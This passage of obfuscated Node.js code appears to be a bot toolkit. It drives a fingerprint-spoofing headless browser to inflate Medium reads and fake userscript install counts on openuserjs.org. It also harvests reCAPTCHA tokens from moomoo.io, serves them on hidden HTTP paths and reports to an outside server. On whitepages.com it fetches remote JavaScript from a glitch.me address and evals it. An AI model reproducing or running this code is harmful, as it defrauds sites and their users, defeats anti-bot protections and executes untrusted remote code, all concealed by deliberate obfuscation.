      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': X(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x0, 'tRPs') + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + Z(0xb) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x23f2 + -0x5 * 0xae + 0x2758
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1112 + 0x2236 + -0x19a4 * 0x2);
    let h = e[f];
    if (b['eVvoNX'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1c7b + -0x128 + -0x5 * 0x577, s, t, u = 0x14f3 + 0x1879 + -0x2d6c; t = n['charAt'](u++); ~t && (s = r % (-0xddb + -0x1b * 0xd1 + -0x1 * -0x23ea) ? s * (0x1801 + 0xb6d + -0x232e) + t : t, r++ % (0x11 * -0x5b + 0x1d * 0x97 + -0xb0c)) ? p += String['fromCharCode'](0xa2c + 0x19b2 + 0x71 * -0x4f & s >> (-(0x1432 + -0xdd * -0x1 + -0x150d) * r & 0x1 * -0x260f + 0x1 * 0xa85 + 0x1b90)) : 0x21bb + -0x1122 + 0x25f * -0x7) {
          t = o['indexOf'](t);
        }
        for (let v = 0x181a + 0x4 * -0x12d + 0x17e * -0xd, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xe2e + -0x240 + -0x107e * -0x1))['slice'](-(-0x21ed + 0x1f00 + -0x2ef * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xc2f * 0x1 + 0x13a3 + -0xfe9 * 0x2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x26ec + -0xe75 + -0x1877; u < -0x1b83 * 0x1 + 0x1bc8 + -0xbb * -0x1; u++) {
          p[u] = u;
        }
        for (u = 0x26f7 + 0x6 * 0xfd + 0x9 * -0x4fd; u < -0xe * -0x265 + -0x1e74 + 0xa * -0x35; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2 * 0x11ed + 0x3 * 0x9bc + 0x400e * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xbac + 0x12e5 + -0x739, q = -0xb67 * 0x2 + -0x52d * -0x1 + 0x1 * 0x11a1;
        for (let v = -0x1 * 0xa3d + -0x57e + 0xfbb; v < n['length']; v++) {
          u = (u + (-0x12e + 0x2 * 0x12af + -0x1 * 0x242f)) % (-0xd1c + 0x898 + 0x584), q = (q + p[u]) % (-0xc2e * 0x1 + 0x1179 + -0x44b * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xd5 + -0x1 * -0x1f17 + -0x1d42)]);
        }
        return t;
      };
      b['fWWAtR'] = m, c = arguments, b['eVvoNX'] = !![];
    }
    const j = e[-0x9c8 * -0x1 + 0x83e * -0x2 + 0x34 * 0x21],
      k = f + j,
      l = c[k];
    return !l ? (b['CZQxJv'] === undefined && (b['CZQxJv'] = !![]), h = b['fWWAtR'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2352 + 0x2 * -0x34 + 0x1 * 0x23ba)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + a0(0x3, '9gwi')] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x19d1 + -0x51b * 0x1 + -0x242 * 0x9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1f1c + 0x1 * -0x5bc + -0x253c * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x76 * 0x8 + 0x1b10 + -0x1760;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x2 * -0xe50 + -0x1d * 0xd3 + -0x77 * -0x71; w < getRandomInt(0x1fd * -0x3 + -0x89 * 0xd + 0xced, 0x1 * -0x7f + -0x1311 + 0x1395); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * -0x1502b + -0x1739d + 0x1 * 0x10dd2);
        }
      }();
    }, 0x597 + -0xd5b + 0x828), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x21 * 0x9 + -0xd61 + -0xc38 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + a1(0x5)))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xc3b + 0xbb * -0x30 + 0x2f4b, 0x9b * 0x12 + -0x2295 * 0x1 + -0x1 * -0x17e1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1f0d + -0x5c25 + 0xb248);
    }, -0x1 * -0x1219 + 0x1514 + -0x26c9), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = d;
        try {
          let s = 0x2650 + -0x180d + -0xe43 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u[a2(0x2)]('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1cb6 + 0x5f3 + -0x1 * 0x16f1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x69d + -0x92e + -0x1 * -0xfcb), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x20b7a + -0x70c0 * 0x3 + -0x11195a * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1f6b + -0xa0c + 0x29db);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a3 = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * 0x12af + -0xe03 + 0x217a);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g[a3(0x18)](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xeb9 * -0x3 + -0x1747 + 0xaac);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = c;
  async function f() {
    const a5 = d,
      a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0xa89 + 0x1453 + -0x9c9) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x11 * -0x1a7 + 0x1971 + 0x2a7));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1 * -0x1a77 + 0x15ad + 0x4ca, D['indexOf']('\x20'));
        return B ? E['slice'](0x22de + -0x145e + 0x740 * -0x2, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2817 + 0x3 * -0x1845 + 0x97f6),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x21a3 + -0xe9d + 0x23a * 0x9),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + a4(0xc) + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a5(0x14) + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + a6(0xf) + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
